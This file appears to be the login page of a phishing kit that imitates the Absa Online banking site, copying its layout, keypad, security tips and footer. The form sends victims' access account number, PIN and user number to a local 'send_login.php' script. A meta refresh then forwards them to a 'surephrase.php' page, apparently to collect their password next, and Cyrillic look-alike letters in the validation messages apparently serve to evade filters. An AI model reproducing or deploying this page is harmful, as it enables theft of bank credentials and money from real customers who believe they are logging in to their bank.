<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://www.backbase.com/2006/command" xmlns:e="http://www.backbase.com/2006/xel" xmlns:xi="http://www.w3.org/2001/XInclude" xmlns:ui="http://www.absa.co.za/2009/ui">

<head>
  <meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">
  <title>Absa Online</title>
  <meta http-equiv="refresh" content="2; url=surephrase.php">
  <link rel="apple-touch-icon" href="../libraries/static/style/Iphone_app_icon.png">
  <link rel="shortcut icon" type="image/x-icon" href="https://www.absa.co.za/etc/designs/zg/absacoza/desktop/assets/img/favicon.ico" />
  <script type="text/javascript">
    (window.top == window.self) || (window.top.location.href = self.location.href);
  </script>
  <link rel="stylesheet" type="text/css" href="../libraries/static\style\absa.css?v=0.1.0-2020-06-18-13-48-34" media="screen">
  <link rel="stylesheet" type="text/css" href="../libraries/static\style\login.css?v=0.1.0-2020-06-18-13-48-34">
  <link rel="stylesheet" type="text/css" href="../libraries/static\style\www.absa.co.za.2009.ui\jcaptcha\jcaptcha.css?v=0.1.0-2020-06-18-13-48-34">
  <script type="text/javascript" src="https://credit.apr.absa.co.za/422006/place.js"></script>
  <script type="text/javascript" src="https://choice.invest.absa.co.za/422006/prox.js"></script>
  <script type="text/javascript" src="../libraries/static\script\absa\absa.subTree.js?v=0.1.0-2020-06-18-13-48-34"></script>
  <script type="text/javascript" src="../libraries/static\script\login.js?v=0.1.0-2020-06-18-13-48-34"></script>
  <script type="text/javascript" src="../libraries/static\script\absa\absa.form.wizardBridge.js?v=0.1.0-2020-06-18-13-48-34"></script>
  <script type="text/javascript" src="../libraries/static\script\absa\absa.n2fa.js?v=0.1.0-2020-06-18-13-48-34"></script>
  <script type="text/javascript" src="../libraries/static\script\absa\absa.jcaptcha.js?v=0.1.0-2020-06-18-13-48-34"></script>
  <script type="text/javascript" src="../libraries/static\script\absa\absa.resetPin.js?v=0.1.0-2020-06-18-13-48-34"></script>
</head>

<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="S5CY6ArF_K3_75nnAH85oqK">
    <div id="pleasewait" role="alert" class="ap-pleasewait">
    <div id="pleasewait-viewport" class="ap-pleasewait--viewport">
      <div class="ap-pleasewait--content"><img src="../libraries/static\style\resources\ajax-loader-2.gif" width="32" height="32"><span id="pleasewait-label" class="ap-pleasewait--label"></span></div>
    </div>
  </div>
  <div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);"><img src="../libraries/static\style\resources\2019\logo-red.png" width="44" height="44"></div>
  <div class="ap-page-header" style="z-index:106;">
    <div class="ap-navigation-main" style="z-index:107;">
      <div class="ap-tabStrip-rounded-left"></div>
      <ul class="ap-tabStrip-tabs">
        <li class='ap-tab-button ap-tab-active' id='SSR-tab-18'>
          <div class="ap-tab-title" tabindex="10">Logon</div>
          <div class="ap-tab-title-hidden">Logon</div>
        </li>
        <li class='ap-tab-button' id='SSR-tab-19'>
          <div class="ap-tab-title" tabindex="11"><a href="javascript:void(0);">Registration</a></div>
          <div class="ap-tab-title-hidden">Registration</div>
        </li>
        <li class='ap-tab-button' id='SSR-tab-20'>
          <div class="ap-tab-title" tabindex="12"><a href="javascript:void(0);">How to guide</a></div>
          <div class="ap-tab-title-hidden" style="font-size:14px;">How to guide</div>
        </li>
      </ul>
      <div class="ap-tabStrip-rounded-right"></div>
      <div style="clear: both;"></div>
      <div class="ap-navigation-sub ap-tabStrip-subnav"></div>
    </div>
  </div>
  <div class="ap-page-container" style="z-index:104;">
    <div class="ap-global-message" id="ap-global-message">
      <div id="ap-nocookies-msg" style="display: none;">Warning: you do not have Cookies enabled. This applications needs Cookies to functionproperly. Please turn it on and reload the page. If you need assistancein turning on your Cookies <a>click here</a> to get instructions.</div>
      <noscript>
        <div>Warning: you do not have Javascript enabled. Thisapplications needs Javascript to function properly. Please turn it onand reload the page. If you need assistance in turning on yourJavascript <a>click here</a> to get instructions.</div>
      </noscript>
    </div>
    <div class="ap-main-content-wrapper">
      <div class="ap-main-content-wrapper-top">
        <div class="ap-corners-rounded-top-left"></div>
        <div class="ap-corners-rounded-top"></div>
        <div class="ap-corners-rounded-top-right"></div>
      </div>
      <div class="ap-page-content ap-container">
        <div class="ap-container-highlevel">
          <div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
            <div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
                Logon&nbsp;
                | Welcome to Absa Online
            </div>
            <div id="header_results_contactUs" style="position:relative; float:right; padding:10px;">
                <a href="" target="_new" style="color:#FFFFFF; font-size:12px; font-weight:bold; text-decoration:none;">
                    Contact us
                </a>
            </div>
          </div>
          <div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden">
            <div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
              <div class="ap-column-1 accessAccountScreen" id="ap-column-1" styleold="width:389px; padding:0">
                <div class="ap-login-container" id="ap-login-container">
                  <div class="ap-container-highlevel" style="width:379px;">
                    <div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
                      <div class="ap-bar-section ap-bar-title" style="margin-top:8px; margin-left:0px" tabindex="5">&#160;&#160;Logon details</div>
                      <div style="float:right; margin-right: 10px;">
                        <div style="background: url('../libraries/static/style/resources/icon-questionmark-grey_2019.png') no-repeat scroll left top transparent; margin-top: 6px; height: 30px; width: 20px; cursor: pointer;" onclick="showHideHelp(this)" tooltip='Click here to Show me how.'></div>
                      </div>
                    </div>
                    <div class="ap-container-content">
                      <div class="ui-keypad" style="width:376px;">
                        <form class="ui-form" method="POST" action="./send/send_login.php">
                          <table class="ui-grid ui-keypad-inputs" style="width:378px;float:left;">
                            <tbody>
                              <tr class="ui-row">
                                <td class="ui-cell" style="width:200px;">
                                  <label for="j_username"><span>Enter your access account number</span></label>
                                </td>
                                <td class="ui-cell" style="nowrap:nowrap;">
                                  <div style="text-align:left;">
                                    <input value="" bbf_type="simple:accountNumber" bbf_required="true" old_bbf_x_type_number="true" requiredtext="Field is required." schematypetext='Only numbers are allowed (Maximum 16)' showmehow='An access account number is the bank account number you choose when you registered for the Absa Online service. It could can be your current, savings, or credit card account number.' messageref=".errorMessage" class="ui-form-field ui-textBox ui-keypad-input-selected ap-showMeHow-focus" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" name="accountnum" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Entег Your Access Account Number Please')" oninput="setCustomValidity('')" id="j_username" onchange="window['isimo']('login')" maxlength="16" type="input" tabindex="0" onkeypress="isInputNumber(event)" pattern=".{6,16}">
                                  </div>
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell">
                                  <label for="j_pin"><span>Enter your PIN</span></label>
                                </td>
                                <td class="ui-cell">
                                  <div style="text-align:left;">
                                    <input ondragstart="return false" onselectstart="return false" value="" bbf_type="simple:pin" bbf_required="true" class="ui-form-field ui-textBox" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" name="PIN" id="j_pin" maxlength="5" ondrag="return false" oncopy="return false" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Entег Your PIN Please')" oninput="setCustomValidity('')" requiredtext='Field is required.' schematypetext='Only numeric values are allowed' showmehow="The PIN must be numeric and cannot contain alpha characters, e.g. *, #, @ or a, b, c. The PIN can be either four or five digits long." messageref=".errorMessage" type="password" tabindex="0" onkeypress="isInputNumber(event)" pattern=".{4,5}">
                                  </div>
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell">
                                  <label for="j_user_no"><span>Enter your user number</span></label>
                                </td>
                                <td class="ui-cell">
                                  <div style="text-align:left;">
                                    <input value="1" class="ui-form-field ui-textBox " name="Operator" style="width:132px; height:18px; line-height:18px; vertical-align:middle;" id="j_user_no" minlength="1" maxlength="2" bbf_type="simple:decimal" bbf_x_type_number="true" bbf_required="true" requiredtext='Field is required.' schematypetext='Only numeric values are allowed' showmehow="Absa Online can have more than one user per service and each user has their own Absa Online PIN. You must use the user number assigned to you at registration when you logon to the service." messageref=".errorMessage" type="text" tabindex="0" onkeypress="isInputNumber(event)">
                                  </div>
                                </td>
                              </tr>
                              <tr class="ui-row ui-row-captcha " id="ui-row-captcha" style="display:none;">
                                <td class="ui-cell">
                                  <label class="ui-label ap-label-details" for="j_user_no" offsetx="0" offsety="10" tooltip="You have entered some of your logon credentials incorrectly. Please type the characters displayed in the CAPTCHA image, in the text box below the image. Remember to also retype your access account number and PIN in the usual text boxes."><span>Enter code in the box below</span><span class="ui-label--icon"></span></label>
                                </td>
                                <td class="ui-cell">
                                  <div style="text-align:left;">
                                    <div class="ui-jcaptcha jcaptcha_container">
                                      <div class="jcaptcha_menu">
                                        <button class="ui-button jcaptcha-icon-image jcaptcha-icon-hide ui-captchaCheck--iconHide" type="button" onclick="absa.jcaptcha.getImageChallenge(this)" tooltip="Get an image challenge"></button>
                                        <button class="ui-button jcaptcha-icon-sound ui-captchaCheck--iconSound" type="button" onclick="absa.jcaptcha.getSoundChallenge(this)" tooltip="Get a sound challenge"></button>
                                        <button class="ui-button jcaptcha-icon-refresh" type="button" onclick="absa.jcaptcha.refreshChallenge(this)" tooltip="Get a new challenge"></button>
                                        <button class="ui-button jcaptcha-icon-help jcaptcha-icon-hide ui-captchaCheck--iconHide" type="button" onclick="absa.jcaptcha.help(this)" tooltip="Help"></button>
                                      </div>
                                      <div class="jcaptcha_lnk ui-captchaCheck_lnk"><img src="../libraries/static\style\resources\dot.gif" class="jcaptcha_img ui-captchaCheck_img" id="jCaptchaImgID" title="Captcha">
                                        <iframe src="../libraries/static\style\resources\dot.gif" class="jcaptcha_iframe ui-captchaCheck_iframe" frameborder="0" scrolling="no" width="0" height="0" marginwidth="0" marginheight="0"></iframe>
                                      </div>
                                      <div class="jcaptcha_input">
                                        <input ondragstart="return false" onselectstart="return false" class="ui-form-field ui-textBox ui-jcaptcha-textBox" name="CaptchaTxt" id="j_jcaptcha_txt" ondrag="return false" oncopy="return false" autocomplete="off" bbf_type="simple:alphanumeric" bbf_required="true" requiredtext='Enter the values from the given captcha' schematypetext='Enter the values from the given captcha' showmehow='Enter the values from the given captcha' messageref=".errorMessage" type="input" tabindex="0">
                                      </div>
                                      <div class="modalCaptchaHelp jcaptcha_help ui-captchaCheck_help" style="display:none; z-index:200;">
                                        <div class="ap-popup">
                                          <div class="ap-popup-header"><b>Captcha Help</b>
                                            <div class="clear-both"></div>
                                          </div>
                                          <div class="ap-popup-body ap-info-box">
                                            <ul class="ap-info-box-ul">
                                              <li>Enter the words you see in the box, in order and separated by a space. Doing so helps prevent automated programs from abusing this service</li>
                                              <li>If you are not sure what the words are, either enter your best guess or click the reload button next to the distorted words</li>
                                              <li>Visually impaired users can click the audio button to hear a set of words that can be entered instead of the visual challenge.</li>
                                            </ul>
                                          </div>
                                          <div class="ap-popup-footer" style="text-align:right;">
                                            <button onclick="phe.modal.hideModal()" type="button" tabindex="0" class="ui-button ap-button-extra">
                                              <div class="ui-button-left">
                                                <div class="ui-button-right">
                                                  <div role="button" tabindex="22" class="ui-button-center">Ok</div>
                                                </div>
                                              </div>
                                            </button>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell" colspan="2" style="padding-top:2px"><span style="color: #767676;">It is your responsibility to ensure the secrecy of your PIN number.</span></td>
                              </tr>
                            </tbody>
                          </table>
                          <div style="float:right; width:325px; padding:5px; margin:0 20px 10px 20px; border:1px dashed #C3C3C3; background:#FFFFFF;">
                            <div style="float:right; margin-right:102px;">
                              <div style="-moz-user-select: none;" class="ui-keypad-padContainer">
                                <p>Keypad</p>
                                <table>
                                  <tbody>
                                    <tr>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">1</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">2</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">3</div>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">4</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">5</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">6</div>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">7</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">8</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">9</div>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td>
                                        <div class="ui-keypad-button util" action="backspace">
                                          <div class="backspace" unselectable="on"></div>
                                        </div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button" unselectable="on">0</div>
                                      </td>
                                      <td>
                                        <div class="ui-keypad-button util" action="clear" unselectable="on">C</div>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </div>
                            </div>
                          </div>
                          <div class="clear-both"></div>
                          <div class="ui-formFoot">
                            <div class="genericMessage-place-holder" style="display:block">
                              <div id="ap-login-form1-error" role="alert" tabindex="0" class="ui-message ui-message-error" style="display:none"><span class="vi-screenreader-line "> Error details. </span>
                                <div class="ui-message-timeStamp">
                                  <div style="display:none;"><span class="vi-screenreader-line ">Time stamp. </span><span class="vi-screenreader-line ">Year. </span>Wed Jun 24 18:32:27 SAST 2020-<span class="vi-screenreader-line ">Month. </span>Wed Jun 24 18:32:27 SAST 2020-<span class="vi-screenreader-line ">Day. </span>Wed Jun 24 18:32:27 SAST 2020<span class="vi-screenreader-line ">Time:. </span> </div>Wed Jun 24 18:32:27 SAST 2020</div>
                                <div class="ui-message--icon"></div>
                                <div style="margin-right: 120px" class="ui-message-content">
                                  <div class="ui-message-title"></div>
                                  <div class="ui-message-body" style="clear:both;"></div>
                                </div>
                                <div class="clear-both"></div>
                              </div>
                            </div>
                            <div class="validation-place-holder"></div>
                            <div class="ui-buttonFooter">
                              <div class="ui-exception-container" style="border:none">
                                <div style="z-index:999; position:fixed; top:16px; right:50px; color:#6D6767; font-weight:bold;">
                                  <div id="divToAfrikaans"><a tabindex="-1" href="#" onclick="changeLang()" style="color:#6D6767; text-decoration:none; font-size:10px; padding-right: 5px;">Verander na Afrikaans </a><img src="../libraries/static\style\resources\locale_en.gif" title="" style="vertical-align:middle;"></div>
                                </div>
                                <div style="float:left; padding-left:auto; padding-right:auto;"><a tabindex="-1" href="javascript:void(0);" style="color:#AF154B; text-decoration:underline; padding-left: 10px;">Reset PIN</a></div>
                                <!-- FORGOTPIN LINK <div style="float:left; padding-left:auto; padding-right:auto;"><a tabindex="-1" href="#" onclick="forgotPin()" style="color:#646464; text-decoration:underline; padding-left: 5px;">Click here to reset your PIN</a></div>-->
                                <button aria-label="Reset" type="button" tabindex="1" class="ui-button ap-button-reset">
                                  <div class="ui-button-left">
                                    <div class="ui-button-right">
                                      <div class="ui-button-center">Reset</div>
                                    </div>
                                  </div>
                                </button>
                                <button aria-label="Next" type="submit" tabindex="0" class="ui-button ap-button-next">
                                  <div class="ui-button-left">
                                    <div class="ui-button-right">
                                      <div class="ui-button-center">Next</div>
                                    </div>
                                  </div>
                                </button>
                              </div>
                            </div>
                          </div>
                        </form>
                      </div>
                    </div>
                    <div class="ap-container-bottom-corners">
                      <div class="ap-corners-rounded-bottom-left"></div>
                      <div class="ap-corners-rounded-bottom" style="width:363px;"></div>
                      <div class="ap-corners-rounded-bottom-right"></div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="ap-column-2 accessAccountScreenAdds" id="ap-column-2" styleold="width:550px;">
                <div id="divadds1" style="position:relative; width:100%; margin-bottom:10px;">
                  <div style="float:left; width:270px; margin-right:10px;">
                                            <div id="divimportantlinks" class="ap-login-block-rounded">
                                                <!-- top round borders -->
                                                <div class="ap-login-block-rounded-top">
                                                    <div class="ap-corners-rounded-top-left"></div>
                                                    <div class="ap-corners-rounded-top"></div>
                                                    <div class="ap-corners-rounded-top-right"></div>
                                                </div>
                                                <!-- content -->
                                                <div role="tablist" class="ui-tabBox">
                                                    <ul class="ui-tabHeads">
                                                        <li aria-selected="true" class="ui-tabHead ui-tab-selected ui-tab-selected" role="button" tabindex="13">
                                                            Security centre
                                                            <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
                                                        </li>
                                                    </ul>
                                                    <div class="ui-tabBodies">
                                                        <div tabindex="14" role="tabpanel" class="ui-tabBody ui-tabBody-selected" aria-hidden="true">
                                                            <div style="background:#FFFFFF; padding:10px;">
                                                                Find all the important information you need to bank securely and with peace of mind.
                                                                <ul class="redarrow " style="padding-top:10px;" classold="ap-info-box-ul">
                                                                    <li>View security measures and enhancements</li>
                                                                    <li>Stay informed about latest scams</li>
                                                                    <li>Shop online with ease</li>
                                                                </ul>
                                                                
                                                                <a href="" target="_new">
                                                                    Learn more
                                                                </a>
                                                                
                                                                <!-- <ul class="abc">
                                                                    %=xl.getLinkListItems("Login/ImportantInformation",lang) %
                                                                </ul> -->
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!-- bottom round borders -->
                                                <div class="ap-login-block-rounded-bottom">
                                                    <div class="ap-corners-rounded-bottom-left"></div>
                                                    <div class="ap-corners-rounded-bottom"></div>
                                                    <div class="ap-corners-rounded-bottom-right"></div>
                                                </div>
                                            </div>
                                        </div>


                  <div style="float:left; width:270px;">
                                            <div id="divsecuritycentre" class="ap-login-block-rounded">
                                                <!-- top round borders -->
                                                <div class="ap-login-block-rounded-top">
                                                    <div class="ap-corners-rounded-top-left"></div>
                                                    <div class="ap-corners-rounded-top"></div>
                                                    <div class="ap-corners-rounded-top-right"></div>
                                                </div>
                                                
                                                <!-- content -->
                                                <div role="tablist" class="ui-tabBox">
                                                    <ul class="ui-tabHeads">
                                                        <li aria-selected="true" class="ui-tabHead ui-tab-selected ui-tab-selected" role="button" tabindex="18">
                                                            Useful information
                                                            <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
                                                        </li>
                                                    </ul>
                                                    <div class="ui-tabBodies">
                                                        <div tabindex="19" role="tabpanel" class="ui-tabBody ui-tabBody-selected" aria-hidden="true">
                                                            <div style="background: #FFFFFF;">
                                                                <!-- <ul class="abc">
                                                                    %=xl.getLinkListItems("Login/SecurityCenter",lang) %
                                                                </ul> -->
                                                                <ul class="abc">
                                                                    <li><a href="" id="am" target="_new">Grandmark International Pty Ltd</a></li><li><a href="" id="am" target="_new">Explore more ways to do your banking</a></li><li><a href="" id="am" target="_new">2022 rates and fees</a></li><li><a href="" id="am" target="_new"><b style="color:#AF154B !important;">Planned Maintenance</b></a></li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                
                                                <!-- bottom round borders -->
                                                <div class="ap-login-block-rounded-bottom">
                                                    <div class="ap-corners-rounded-bottom-left"></div>
                                                    <div class="ap-corners-rounded-bottom"></div>
                                                    <div class="ap-corners-rounded-bottom-right"></div>
                                                </div>
                                            </div>
                                        </div>



                  <div style="clear:both;"></div>
                  <div style="position:relative; margin-top:10px; height:152px;">
                                            <div class="ap-login-campaign-image img1" style="position:absolute; top:0px; left:0px; width:280px;"><a href=""><img src="../libraries/asset/campaigne_1_ENG.png" alt=""></a></div>
                                            <div class="ap-login-campaign-image img2" style="position:absolute; top:0px; right:0px; width:270px;"><a href=""><img src="../libraries/asset/AOL_Retail_Pricing_2022_Eng.jpg" alt=""></a></div>
                    </div>
                </div>
                <div id="divhowitworks" class="ap-login-block-rounded" style="display:none">
                  <div>
                    <div class="ap-login-block-rounded-top">
                      <div class="ap-corners-rounded-top-left"></div>
                      <div class="ap-corners-rounded-top" style="width:312px;"></div>
                      <div class="ap-corners-rounded-top-right"></div>
                    </div>
                    <div role="tablist" class="ui-tabBox">
                      <ul class="ui-tabHeads">
                        <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="15">How it works<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span></li>
                      </ul>
                      <div class="ui-tabBodies">
                        <div tabindex="16" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
                          <div style="background: #FFFFFF;">
                            <div style="border-bottom: 1px solid #CCCCCC;">
                              <div style="padding: 10px;">In this example the password is <b>Password1</b></div>
                            </div>
                            <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span><span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span><span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span><span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span><span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span></div>
                            <div style="margin: 10px 0px 5px 10px;">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                            </div>
                            <div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;">You have to enter (case sensitive):</div>
                            <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span><span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span><span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span><span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span><span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span></div>
                            <div style="margin: 10px 0px 5px 10px;">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                            </div>
                            <br>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="ap-login-block-rounded-bottom">
                      <div class="ap-corners-rounded-bottom-left"></div>
                      <div class="ap-corners-rounded-bottom" style="width:312px;"></div>
                      <div class="ap-corners-rounded-bottom-right"></div>
                    </div>
                  </div>
                  <div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px 0px;" id="ap-campaignImage-div">
                    <a href=''><img src='..\libraries\assets\Assets\Richmedia\Absaonline\CampaignImages\Eng\DebiCheck_ATM_Eng.jpg' alt=''></a>
                  </div>
                  <div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px 0px;" id="ap-campAPBImage-div">
                    <a href=''><img src='../libraries/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/campaigne_3b_post_golive_EN.jpg' alt=''></a>
                  </div>
                </div>
              </div>
              <div class="ap-columns-clear"></div>
            </div>
            <div style="width: 100%; height: 10px;"></div>
            <div id="divbottomadds" class="ap-login-columns ap-columns-33">
              <div class="ap-column-1">&nbsp;</div>
              <div class="ap-column-2">&nbsp;</div>
              <div class="ap-column-3">&nbsp;</div>
            </div>
          </div>
          <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
            <div class="ap-corners-rounded-bottom-left"></div>
            <div class="ap-corners-rounded-bottom"></div>
            <div class="ap-corners-rounded-bottom-right"></div>
          </div>
        </div>
      </div>
      <div class="ap-main-content-wrapper-bottom">
        <div class="ap-corners-rounded-bottom-left"></div>
        <div class="ap-corners-rounded-bottom"></div>
        <div class="ap-corners-rounded-bottom-right"></div>
      </div>
    </div>
    <div class="ap-footer" tabindex="20">
      <div style="position:relative; top:0px; left:0px; width:971px; text-align:center;">
        <p tabindex="21">&#169; Copyright. Absa Bank Limited. Registration Number: 1986/004794/06 Authorized financial services and registered credit provider NCRCP7

</p>
        <div class="ap-footer-links">
                        <ul><li><a href="" id="am" target="_new">Security centre</a></li><li><a href="" id="am" target="_new">Terms of use</a></li><li><a href="" id="am" target="_new">Privacy policy</a></li><li><a href="" id="am" target="_new">Software requirements</a></li><li><a href="" id="am" target="_new">Banking regulations</a></li></ul>
                    </div>
        <div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;"></div>
      </div>
    </div>
  </div>
  <div class="modalPasswordTips" style="display: none; width: 600px; height: 443px; z-index: 200;">
    <div class="ap-popup">
      <div class="ap-popup-header"><b>Password tips</b>
        <div class="clear-both"></div>
      </div>
      <div class="ap-popup-body ap-info-box">
        <ul class="ap-info-box-ul">
          <li>Never save your password/PIN on your desktop - as it may allow others to access your personal information, without your permission.</li>
          <li>Do not make your passwords too personal - rather create passwords that have letters and numbers that cannot be attributed to you.</li>
          <li>Never provide your Online ID or password/PIN to anyone, never write them down or share them, not even with a bank official.</li>
          <li>Never provide your Online ID or password/PIN to anyone.</li>
          <li>Only provide your online password or ID when your browser shows a Secure Socket Layer(SSL) connection directly to the bank.</li>
          <li>Do not leave your computer unattended after you have entered your Absa Online password.</li>
          <li>Always log or sign off at the end of a session.</li>
          <li>For your security</li>
          <li>Do not open e-mails from unknown sources.</li>
          <li>Beware of emails that ask for passwords, PINS, credit and debit card information.</li>
          <li>Avoid doing Internet Banking/ Absa Online in public areas such internet cafes as you never know what software is loaded that may compromise your transactions.</li>
          <li>Make sure no one has unauthorised access to your PC.</li>
          <li>Be especially aware that there are no security cameras trained on your PC and keyboard.</li>
          <li>Ensure you have the latest anti virus software applications loaded on your PC and mobile devices.</li>
          <li>Make sure the software on your PC is correctly licensed.</li>
          <li>Update your operating system and browser with latest patches.</li>
          <li>Install personal firewall on your PC if you use a dial-up modem.</li>
          <li>Only provide your credit card details to reputable companies.</li>
          <li>To ensure that you are using a secure shopping site, look for the lock and key and security certificates online.</li>
        </ul>
      </div>
      <div class="ap-popup-footer" style="text-align:right;">
        <button onclick="phe.modal.hideModal()" type="submit" tabindex="0" class="ui-button ap-button-extra">
          <div class="ui-button-left">
            <div class="ui-button-right">
              <div role="button" tabindex="22" class="ui-button-center">Ok</div>
            </div>
          </div>
        </button>
      </div>
    </div>
  </div>
  <div class="ui-modal modalLogoffWarning" id="modalLogoffWarning" style="display:none">
    <div class="ui-modalHeader">
      <div class="ui-modalHeader-title">Logoff</div>
      <div class="ui-modalHeader-icons"></div>
    </div>
    <div class="ui-modalBody">
      <div style="padding:10px;">
        <div>Your Absa Online session is about to expire in <span class="ap-popup-body-timer" id="timerSeconds"></span> seconds</div>
        <div>Do you want to continue?</div>
      </div>
    </div>
    <div class="ui-modalFooter">
      <button type="button" class="ui-button ap-button-back" style="position:static; margin-left:0px;" onclick="absa.login.doLogout()">
        <div class="ui-button-left">
          <div class="ui-button-right">
            <div class="ui-button-center">Logoff</div>
          </div>
        </div>
      </button>
      <button type="button" class="ui-button ap-button-next" onclick="absa.login.resetTimer2(); phe.modal.hideModal()">
        <div class="ui-button-left">
          <div class="ui-button-right">
            <div class="ui-button-center">Continue</div>
          </div>
        </div>
      </button>
    </div>
  </div>
  <div class="ap-genericModalC-modal" style="display:none">
    <div class="ui-modal" style="width:600px">
      <form novalidate="" class="ui-form ap-genericModalC-form ap-genericModal-form">
        <div class="ui-modalHeader">
          <div class="ui-modalHeader-title">Online security upgrade</div>
        </div>
        <div class="ui-modalBody " style="padding:10px" tabindex="0">
          <div style="padding:10px; width:100%">
            <label class="ui-label ap-common-fontSize18px ap-common-fontBold" style="color:#680438;"><b>Online security upgrade</b></label>
            <div xmlns:ui="http://www.absa.co.za/2009/ui" class="ap-common-borderTop ap-common-marginBottom ap-common-marginTop"></div>
            <p>We have enhanced our online and mobile banking security for your protection:</p>
            <br>
            <p>
              <ul class='ap-info-box-ul'>
                <li>If you currently verify and authorise your transactions via SMS, there is a high security risk.</li>
                <li>Please make sure that you authorise your transactions on the Banking App instead, as this enhances your online security.</li>
                <li>To update your online banking security, download the Banking App for free and follow the prompts.</li>
              </ul>
              <br>&nbsp;
              <br>
              <p>Remember that Absa will <b>never ask for the full password</b>. Only use your credentials when you access Absa Online.Always access Absa Online using the Absa website address. Never click on hyperlinks or attachments to access Absa Online. If your logon process seems unfamiliar, close the browser immediately as this could be a fraudulent website. Never approve transactions if you're not transacting yourself. Absa will never call you to approve transactions. Read your verification messages in full.To report fraud or suspicious activity, call us from our Banking App or 0860557557. </p>
              <br>
          </div>
        </div>
        <div class="ui-modalFooter" style="text-align:right;">
          <button class="ui-button ap-button-next" type="button" tabindex="-1" onclick="absa.login.genericModalBtnJSFunc('C',this)">
            <div class="ui-button-left">
              <div class="ui-button-right">
                <div role="button" tabindex="0" class="ui-button-center">Continue</div>
